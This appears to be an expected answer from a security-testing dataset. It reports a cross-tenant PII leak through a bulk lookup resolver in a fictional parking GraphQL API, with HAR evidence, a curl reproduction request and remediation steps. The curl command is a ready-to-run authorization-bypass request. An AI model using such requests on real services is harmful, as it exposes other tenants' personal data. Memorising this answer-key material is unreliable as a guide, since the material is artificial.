# Expected Response

## System
- Domain: Parking / Smart City
- System: ParkIQ Management API
- Example ID: GQL-0150

## Priority Findings

### Finding 1: Smart Parking — Operational PII Leakage via Bulk Intersection Lookup (Pattern 7.1)
**Severity:** Critical
**Category:** Logging Failures / Operational PII Leakage

**Summary:**
Per §5.0 (Pattern 7.1 — operational PII/PHI leakage): The `bulkIntersectionLookup` resolver exposes cross-tenant parking operational data including PII without tenancy enforcement. An attacker from `tenant-f1c6` queried `bulkIntersectionLookup(ids: ["I-2150", "I-1150", "I-3150"])` and received smart parking data belonging to `tenant-ef42`, including `CONFIDENTIAL-f1c6ef42`. In Parking / Smart City, this exposes vehicle plate records, occupancy sensors, payment records, and violation data.

**Evidence from HAR:**
- Request: `POST https://api.parkiq-management-ap.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-f1c6`
- Query: `bulkIntersectionLookup(ids: ["I-2150", "I-1150", "I-3150"]) { nodeId tenantId data { sensitiveField } }`
- Response `200 OK`: `tenantId: "tenant-ef42"`, `ownerId: "other-user-f1c6ef42"`, `sensitiveField: "CONFIDENTIAL-f1c6ef42"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-f1c6ef42`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 7.1 | Operational PII leakage via bulk lookup |
| HAR request | ids array | I-2150, I-1150, I-3150 (cross-tenant) |
| HAR response | tenantId | tenant-ef42 parking data returned |
| HAR response | sensitiveField | CONFIDENTIAL-f1c6ef42 |

## Steps to Reproduce

### Step 1 — Bulk intersection lookup PII leak (HAR)
```bash
curl -s -X POST https://api.parkiq-management-ap.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-f1c6" \
  -d '{"query": "query { bulkIntersectionLookup(ids: [\"I-2150\", \"I-1150\", \"I-3150\"]) { nodeId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** `tenant-ef42` parking PII returned. **Secure:** Only `tenant-f1c6` data or FORBIDDEN.

## Remediation
1. Bulk lookup: `WHERE node_id = ANY($ids) AND tenant_id = $jwt.tenantId`.
2. Mask `internalNotes` from schema; restrict PII fields to owning tenant.
3. Audit log all bulk lookups with `x-request-id`.
4. Redis cache key: `intersection:{tenantId}:{nodeId}`.
